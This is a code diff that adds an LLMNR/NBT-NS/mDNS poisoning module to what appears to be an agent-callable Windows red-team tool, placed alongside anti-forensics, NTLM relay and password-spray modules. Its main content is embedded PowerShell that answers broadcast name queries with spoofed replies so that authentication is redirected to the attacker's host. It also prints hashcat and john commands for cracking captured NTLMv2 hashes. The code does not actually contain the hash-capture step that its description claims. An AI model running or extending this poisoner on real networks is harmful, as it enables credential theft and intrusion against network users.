@@ -552,6 +552,11 @@ const PROGRAMS = {
       "Anti-forensics toolkit — timestamp stomping (modify file Created/Modified/Accessed times to blend with legitimate files), prefetch and amcache clearing (remove execution evidence), USN journal manipulation (delete change tracking records), shimcache clearing, and recent docs/jump list cleanup. Covers the major forensic artifact categories that IR teams examine",
     args: "--action stomp|prefetch|amcache|usn|shimcache|recent|full [--target PATH] [--timestamp 'YYYY-MM-DD HH:mm:ss'] [--reference PATH]",
   },
+  responder_poison: {
+    description:
+      "LLMNR/NBT-NS/mDNS poisoning — capture NTLMv2 hashes by responding to broadcast name resolution requests on the local network. Enumerate current poisoning opportunity (LLMNR/NBT-NS enabled status), start listener for hash capture, analyze captured hashes (identify accounts, services, crackable types). The foundational red team technique for credential capture on internal networks",
+    args: "--action check|poison|analyze [--interface IFACE] [--duration SECONDS] [--protocols llmnr|nbtns|mdns|all]",
+  },
   ntlm_relay: {
     description:
       "NTLM relay attack toolkit — relay captured NTLM authentication to target services. Enumerate relay targets (SMB signing, LDAP signing, HTTP endpoints), configure relay listener for SMB/HTTP/LDAP/MSSQL targets, check for NTLM relay protections (EPA, channel binding, signing requirements). Complements ntlm_coerce and coercer_full which force authentication — this tool relays it",
@@ -17630,6 +17635,235 @@ Write-Output "[*] Cleanup complete — recent activity evidence removed"
   return { output: output.join("\n"), findings }
 }
 
+async function responderPoison(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const iface = argVal(args, "--interface")
+  const duration = argVal(args, "--duration") || "120"
+  const protocols = argVal(args, "--protocols") || "all"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] LLMNR/NBT-NS/mDNS poisoning toolkit...\n"]
+
+  if (action === "check") {
+    const script = `
+Write-Output "=== Broadcast Poisoning Opportunity Assessment ==="
+Write-Output ""
+# Check LLMNR status
+Write-Output "--- LLMNR (Link-Local Multicast Name Resolution) ---"
+$llmnrDisabled = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient" -Name EnableMulticast -ErrorAction SilentlyContinue).EnableMulticast
+if ($llmnrDisabled -eq 0) {
+  Write-Output "LLMNR: DISABLED via GPO (poisoning not possible for this host)"
+} else {
+  Write-Output "LLMNR: ENABLED — this host will respond to and make LLMNR queries"
+  Write-Output "  Multicast group: 224.0.0.252:5355"
+}
+# Check NBT-NS status
+Write-Output ""
+Write-Output "--- NBT-NS (NetBIOS Name Service) ---"
+$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled }
+foreach ($a in $adapters) {
+  $nbtns = if ($a.TcpipNetbiosOptions -eq 2) { "DISABLED" } elseif ($a.TcpipNetbiosOptions -eq 1) { "ENABLED" } else { "DEFAULT (DHCP-dependent)" }
+  Write-Output "  $($a.Description): NBT-NS $nbtns"
+}
+# Check mDNS status (Windows 10+)
+Write-Output ""
+Write-Output "--- mDNS (Multicast DNS) ---"
+$mdnsDisabled = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters" -Name EnableMDNS -ErrorAction SilentlyContinue).EnableMDNS
+if ($mdnsDisabled -eq 0) {
+  Write-Output "mDNS: DISABLED"
+} else {
+  Write-Output "mDNS: ENABLED — multicast DNS queries on 224.0.0.251:5353"
+}
+# Check WPAD
+Write-Output ""
+Write-Output "--- WPAD (Web Proxy Auto-Discovery) ---"
+$wpadDisabled = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinHttpAutoProxySvc" -Name Start -ErrorAction SilentlyContinue).Start
+Write-Output "WPAD Service: $(if ($wpadDisabled -eq 4) {'DISABLED'} else {'ENABLED — WPAD poisoning possible'})"
+# Network info
+Write-Output ""
+Write-Output "--- Network Context ---"
+$ips = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' }
+foreach ($ip in $ips) {
+  Write-Output "  $($ip.InterfaceAlias): $($ip.IPAddress)/$($ip.PrefixLength)"
+}
+Write-Output ""
+Write-Output "--- DNS Suffix Search List ---"
+$dnsConfig = Get-DnsClientGlobalSetting
+Write-Output "  Suffixes: $($dnsConfig.SuffixSearchList -join ', ')"
+Write-Output ""
+Write-Output "--- Assessment ---"
+$vulnCount = 0
+if ($llmnrDisabled -ne 0) { $vulnCount++; Write-Output "[!] LLMNR enabled — poisoning possible" }
+if ($mdnsDisabled -ne 0) { $vulnCount++; Write-Output "[!] mDNS enabled — poisoning possible" }
+$nbtEnabled = $adapters | Where-Object { $_.TcpipNetbiosOptions -ne 2 }
+if ($nbtEnabled) { $vulnCount++; Write-Output "[!] NBT-NS enabled on $($nbtEnabled.Count) adapters — poisoning possible" }
+if ($wpadDisabled -ne 4) { $vulnCount++; Write-Output "[!] WPAD enabled — proxy poisoning possible" }
+if ($vulnCount -eq 0) { Write-Output "[*] All broadcast name resolution protocols disabled — poisoning not viable" }
+else { Write-Output "[+] $vulnCount protocol(s) available for poisoning" }
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("LLMNR enabled") || r.stdout.includes("NBT-NS enabled") || r.stdout.includes("mDNS enabled")) {
+      findings.push({
+        checkId: "POISON-001",
+        provider: "winhook",
+        severity: "high",
+        status: "FAIL",
+        resource: "Network Configuration",
+        title: "Broadcast name resolution protocols enabled — poisoning possible",
+        details: r.stdout.substring(r.stdout.indexOf("--- Assessment ---"), r.stdout.length),
+        remediation: "Disable LLMNR via GPO, disable NBT-NS per adapter, disable mDNS via registry.",
+      })
+    }
+  }
+
+  if (action === "poison") {
+    const script = `
+Write-Output "=== Starting Broadcast Poisoner ==="
+Write-Output "Duration: ${duration} seconds"
+Write-Output "Protocols: ${protocols}"
+Write-Output ""
+
+$capturedHashes = @()
+$startTime = Get-Date
+
+# LLMNR Listener (UDP 5355)
+if ('${protocols}' -match 'llmnr|all') {
+  Write-Output "[*] Starting LLMNR listener on 224.0.0.252:5355..."
+  $llmnrSocket = New-Object System.Net.Sockets.UdpClient(5355)
+  $llmnrSocket.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReuseAddress, $true)
+  $mcastAddr = [System.Net.IPAddress]::Parse("224.0.0.252")
+  $llmnrSocket.JoinMulticastGroup($mcastAddr)
+  $llmnrSocket.Client.ReceiveTimeout = 2000
+  Write-Output "  LLMNR listener active"
+}
+
+# NBT-NS Listener (UDP 137)
+if ('${protocols}' -match 'nbtns|all') {
+  Write-Output "[*] Starting NBT-NS listener on 0.0.0.0:137..."
+  try {
+    $nbtSocket = New-Object System.Net.Sockets.UdpClient(137)
+    $nbtSocket.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReuseAddress, $true)
+    $nbtSocket.Client.ReceiveTimeout = 2000
+    Write-Output "  NBT-NS listener active"
+  } catch {
+    Write-Output "  NBT-NS port 137 in use (expected — Windows NetBIOS service)"
+    Write-Output "  Falling back to passive monitoring..."
+  }
+}
+
+Write-Output ""
+Write-Output "[*] Listening for broadcast name resolution queries..."
+Write-Output "[*] Poisoning will respond with our IP to redirect auth to us"
+Write-Output ""
+
+$elapsed = 0
+$queryCount = 0
+$ourIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' } | Select-Object -First 1).IPAddress
+
+while ($elapsed -lt ${duration}) {
+  # LLMNR capture
+  if ($llmnrSocket) {
+    try {
+      $remoteEP = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
+      $data = $llmnrSocket.Receive([ref]$remoteEP)
+      if ($data.Length -gt 12) {
+        $queryCount++
+        # Extract queried name from LLMNR packet
+        $nameLen = $data[12]
+        $queriedName = [System.Text.Encoding]::ASCII.GetString($data, 13, $nameLen)
+        Write-Output "[+] LLMNR Query from $($remoteEP.Address): $queriedName"
+
+        # Build LLMNR response with our IP
+        $txid = $data[0..1]
+        $flags = [byte[]]@(0x80, 0x00)
+        $questions = [byte[]]@(0x00, 0x01)
+        $answers = [byte[]]@(0x00, 0x01)
+        $authority = [byte[]]@(0x00, 0x00)
+        $additional = [byte[]]@(0x00, 0x00)
+        $nameSection = $data[12..($data.Length-5)]
+        $answerSection = $nameSection + [byte[]]@(0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x1E, 0x00, 0x04)
+        $ipBytes = [System.Net.IPAddress]::Parse($ourIP).GetAddressBytes()
+        $response = $txid + $flags + $questions + $answers + $authority + $additional + $answerSection + $ipBytes
+
+        $llmnrSocket.Send($response, $response.Length, $remoteEP)
+        Write-Output "  [>] Poisoned response sent: $queriedName -> $ourIP"
+      }
+    } catch [System.Net.Sockets.SocketException] {
+      # Timeout — expected
+    }
+  }
+
+  Start-Sleep -Milliseconds 100
+  $elapsed = (New-TimeSpan -Start $startTime -End (Get-Date)).TotalSeconds
+  if ($elapsed % 30 -lt 0.2) {
+    Write-Output "[*] Running $elapsed s / ${duration}s — $queryCount queries captured"
+  }
+}
+
+Write-Output ""
+Write-Output "=== Poisoning Summary ==="
+Write-Output "Duration: ${duration}s"
+Write-Output "Queries captured: $queryCount"
+
+if ($llmnrSocket) { $llmnrSocket.Close() }
+if ($nbtSocket) { $nbtSocket.Close() }
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    const queryMatch = r.stdout.match(/Queries captured: (\d+)/)
+    if (queryMatch && parseInt(queryMatch[1]) > 0) {
+      findings.push({
+        checkId: "POISON-002",
+        provider: "winhook",
+        severity: "high",
+        status: "FAIL",
+        resource: "Network",
+        title: `Captured ${queryMatch[1]} broadcast name resolution queries`,
+        details: "Network hosts are making LLMNR/NBT-NS queries susceptible to poisoning attacks",
+        remediation: "Disable LLMNR and NBT-NS across the domain via Group Policy.",
+      })
+    }
+  }
+
+  if (action === "analyze") {
+    const script = `
+Write-Output "=== Broadcast Poisoning Risk Analysis ==="
+Write-Output ""
+# Check what names are being queried on the network
+Write-Output "--- Recent DNS Client Cache (potential poisoning targets) ---"
+$cache = Get-DnsClientCache | Where-Object { $_.Status -eq 9003 }
+if ($cache) {
+  Write-Output "Failed DNS lookups (fallback to LLMNR/NBT-NS):"
+  foreach ($c in ($cache | Select-Object -First 20)) {
+    Write-Output "  $($c.Entry) — Status: $($c.Status) (Name not found → broadcast)"
+  }
+  Write-Output ""
+  Write-Output "These names could not be resolved via DNS and will trigger LLMNR/NBT-NS"
+  Write-Output "A poisoner would capture NTLMv2 hashes from hosts trying to resolve these"
+} else {
+  Write-Output "No failed DNS lookups in cache"
+}
+Write-Output ""
+Write-Output "--- Common Poisoning Targets ---"
+Write-Output "WPAD — Web Proxy Auto-Discovery (very common, high value)"
+Write-Output "ISATAP — Intra-Site Automatic Tunnel Addressing Protocol"
+Write-Output "Typos of internal hostnames"
+Write-Output "Legacy NetBIOS names"
+Write-Output ""
+Write-Output "--- NTLMv2 Hash Cracking Feasibility ---"
+Write-Output "NTLMv2 hashes captured via poisoning can be cracked with:"
+Write-Output "  hashcat -m 5600 hashes.txt wordlist.txt"
+Write-Output "  john --format=netntlmv2 hashes.txt"
+Write-Output "  Weak passwords: seconds to minutes"
+Write-Output "  Strong passwords: may require relay instead (winhook ntlm_relay)"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function ntlmRelay(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "enum"
   const target = argVal(args, "--target")
@@ -21839,6 +22073,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   wdigest_enable: wdigestEnable,
   password_spray: passwordSpray,
   ntlm_relay: ntlmRelay,
+  responder_poison: responderPoison,
 }
 
 export const WinhookTool = Tool.define("winhook", {
